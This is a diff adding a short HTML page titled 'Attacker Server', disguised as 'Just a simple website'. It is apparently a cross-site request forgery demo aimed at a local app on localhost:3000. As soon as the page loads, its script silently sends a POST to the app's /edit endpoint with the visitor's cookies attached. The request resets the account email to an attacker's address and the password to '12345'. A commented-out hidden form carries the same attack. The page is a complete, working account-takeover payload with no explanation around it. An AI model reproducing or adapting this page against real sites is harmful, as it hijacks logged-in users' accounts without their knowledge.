@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Server</title>
+</head>
+<body>
+    <div>
+        <h1>
+            Just a simple website
+        </h1>
+        <!-- <form name="form" action="http://localhost:3000/edit" method="POST">
+            <input type="hidden" name="email" value="tehackeecarevrga@gmail.com">
+        </form> -->
+    </div>
+    <script>
+        // document.form.submit();
+
+        fetch('http://localhost:3000/edit', {
+            method: 'POST',
+            credentials: 'include',
+            mode:'no-cors',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: 'email=tehackeecarevrga@gmail.com&password=12345',
+        })
+          .then(res => console.log(res.status))
+          .catch(err => console.log(err));
+    </script>
+</body>
+</html>
